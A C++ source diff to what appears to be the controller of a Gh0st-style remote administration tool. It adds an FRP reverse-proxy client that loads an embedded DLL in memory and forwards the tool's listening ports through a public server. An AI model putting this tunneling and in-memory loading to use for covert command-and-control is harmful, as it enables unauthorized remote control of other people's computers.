@@ -185,6 +185,22 @@ std::string GetDbPath() {
 	return dbPath;
 }
 
+std::string GetFrpSettingsPath() {
+#ifdef _DEBUG
+	char path[MAX_PATH];
+	GetModuleFileNameA(NULL, path, MAX_PATH);
+	GET_FILEPATH(path, "frpc.ini");
+	return path;
+#else
+	static char path[MAX_PATH], * name = "frpc.ini";
+	static std::string ret = (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path)) ? "." : path)
+		+ std::string("\\YAMA\\");
+	static BOOL ok = CreateDirectoryA(ret.c_str(), NULL);
+	static std::string p = ret + name;
+	return p;
+#endif
+}
+
 std::string GetFileName(const char* filepath) {
 	const char* slash1 = strrchr(filepath, '/');
 	const char* slash2 = strrchr(filepath, '\\');
@@ -406,6 +422,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_UPXTASKRESULT, UPXProcResult)
 	ON_MESSAGE(WM_PASSWORDCHECK, OnPasswordCheck)
 	ON_MESSAGE(WM_SHOWMESSAGE, OnShowMessage)
+	ON_MESSAGE(WM_SHOWERRORMSG, OnShowErrMessage)
 	ON_WM_HELPINFO()
 	ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
 	ON_COMMAND(ID_TOOL_AUTH, &CMy2015RemoteDlg::OnToolAuth)
@@ -688,6 +705,21 @@ VOID CMy2015RemoteDlg::ShowMessage(CString strType, CString strMsg)
 
 	strStatusMsg.Format("有%d个主机在线",m_iCount);
 	m_StatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字
+}
+
+LRESULT CMy2015RemoteDlg::OnShowErrMessage(WPARAM wParam, LPARAM lParam) {
+	CString* text = (CString*)wParam;
+	CString err = *text;
+	delete text;
+
+	CTime Timer = CTime::GetCurrentTime();
+	CString strTime = Timer.Format("%H:%M:%S");
+
+	m_CList_Message.InsertItem(0, "操作错误");
+	m_CList_Message.SetItemText(0, 1, strTime);
+	m_CList_Message.SetItemText(0, 2, err);
+
+	return S_OK;
 }
 
 extern "C" BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, 
@@ -1003,7 +1035,84 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 		"请设置\"公网IP\"，或使用反向代理服务器的IP";
 	ShowMessage("使用提示", tip);
 
+#ifdef _WIN64
+	if (!master.empty()) {
+		int use = THIS_CFG.GetInt("frp", "UseFrp");
+		if (use) {
+			m_hFRPThread = CreateThread(NULL, 0, StartFrpClient, this, NULL, NULL);
+		}
+	}
+#endif
+
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
+}
+
+DWORD WINAPI CMy2015RemoteDlg::StartFrpClient(LPVOID param){
+	CMy2015RemoteDlg* This = (CMy2015RemoteDlg*)param;
+	Mprintf("[FRP] Proxy thread start running\n");
+
+	do 
+	{
+		DWORD size = 0;
+		LPBYTE frpc = ReadResource(IDR_BINARY_FRPC, size);
+		if (frpc == nullptr) {
+			Mprintf("Failed to read FRP DLL\n");
+			break;
+		}
+		HMEMORYMODULE hDLL = MemoryLoadLibrary(frpc, size);
+		SAFE_DELETE_ARRAY(frpc);
+		if (hDLL == NULL) {
+			Mprintf("Failed to load FRP DLL\n");
+			break;
+		}
+		typedef int (*Run)(char* cstr, int* ptr);
+		Run run = (Run)MemoryGetProcAddress(hDLL, "Run");
+		if (!run) {
+			Mprintf("Failed to get FRP function\n");
+			MemoryFreeLibrary(hDLL);
+			break;
+		}
+		std::string s = GetFrpSettingsPath();
+		int n = run((char*)s.c_str(), &(This->m_frpStatus));
+		if (n) {
+			Mprintf("Failed to run FRP function\n");
+			This->PostMessage(WM_SHOWERRORMSG,(WPARAM)new CString("反向代理: 公网IP和代理设置是否正确? FRP 服务端是否运行?"));
+		}
+		// Free FRP DLL will cause crash
+		// Do NOT use MemoryFreeLibrary and 528 bytes memory leak detected when exiting master
+		// MemoryFreeLibrary(hDLL);
+	} while (false);
+
+	CloseHandle(This->m_hFRPThread);
+	This->m_hFRPThread = NULL;
+	Mprintf("[FRP] Proxy thread stop running\n");
+
+	return 0x20250731;
+}
+
+void CMy2015RemoteDlg::ApplyFrpSettings() {
+	auto master = THIS_CFG.GetStr("settings", "master");
+	if (master.empty()) return;
+
+	config cfg(GetFrpSettingsPath());
+	cfg.SetStr("common", "server_addr", master);
+	cfg.SetInt("common", "server_port", THIS_CFG.GetInt("frp", "server_port", 7000));
+	cfg.SetStr("common", "token", THIS_CFG.GetStr("frp", "token"));
+	cfg.SetStr("common", "log_file", THIS_CFG.GetStr("frp", "log_file", "./frpc.log"));
+
+	auto ports = THIS_CFG.GetStr("settings", "ghost", "6543");
+	auto arr = StringToVector(ports, ';');
+	for (int i = 0; i < arr.size(); ++i) {
+		auto tcp = "YAMA-TCP-" + arr[i];
+		cfg.SetStr(tcp, "type", "tcp");
+		cfg.SetStr(tcp, "local_port", arr[i]);
+		cfg.SetStr(tcp, "remote_port", arr[i]);
+
+		auto udp = "YAMA-UDP-" + arr[i];
+		cfg.SetStr(udp, "type", "udp");
+		cfg.SetStr(udp, "local_port", arr[i]);
+		cfg.SetStr(udp, "remote_port", arr[i]);
+	}
 }
 
 void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
@@ -1203,6 +1312,7 @@ void CMy2015RemoteDlg::Release(){
 	Mprintf("======> Release\n");
 	DeletePopupWindow();
 	isClosed = TRUE;
+	m_frpStatus = STATUS_EXIT;
 	ShowWindow(SW_HIDE);
 
 	Shell_NotifyIcon(NIM_DELETE, &m_Nid);
@@ -1218,6 +1328,8 @@ void CMy2015RemoteDlg::Release(){
 	}
 	LeaveCriticalSection(&m_cs);
 	Sleep(500);
+	while (m_hFRPThread)
+		Sleep(20);
 
 	THIS_APP->Destroy();
 	g_2015RemoteDlg = NULL;
@@ -1619,9 +1731,26 @@ void CMy2015RemoteDlg::OnMainSet()
 {
 	CSettingDlg  Dlg;
 	Dlg.m_nMax_Connect = m_nMaxConnection;
+	BOOL use = THIS_CFG.GetInt("frp", "UseFrp");
+	int port = THIS_CFG.GetInt("frp", "server_port", 7000);
+	auto token = THIS_CFG.GetStr("frp", "token");
+	auto ret = Dlg.DoModal();   //模态 阻塞
+	if (ret != IDOK) return;
 
-	Dlg.DoModal();   //模态 阻塞
-
+	BOOL use_new = THIS_CFG.GetInt("frp", "UseFrp");
+	int port_new = THIS_CFG.GetInt("frp", "server_port", 7000);
+	auto token_new = THIS_CFG.GetStr("frp", "token");
+	ApplyFrpSettings();
+	if (use_new != use) {
+		MessageBoxA("修改FRP代理开关，需要重启当前应用程序方可生效。", "提示", MB_ICONINFORMATION);
+	} else if (port != port_new || token != token_new) {
+		m_frpStatus = STATUS_STOP;
+		Sleep(200);
+		m_frpStatus = STATUS_RUN;
+	}
+	if (use && use_new && m_hFRPThread == NULL) {
+		MessageBoxA("FRP代理服务异常，需要重启当前应用程序进行重试。", "提示", MB_ICONINFORMATION);
+	}
 	int m = atoi(THIS_CFG.GetStr("settings", "ReportInterval", "5").c_str());
 	int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
 	if (m== m_settings.ReportInterval && n == m_settings.DetectSoftware) {
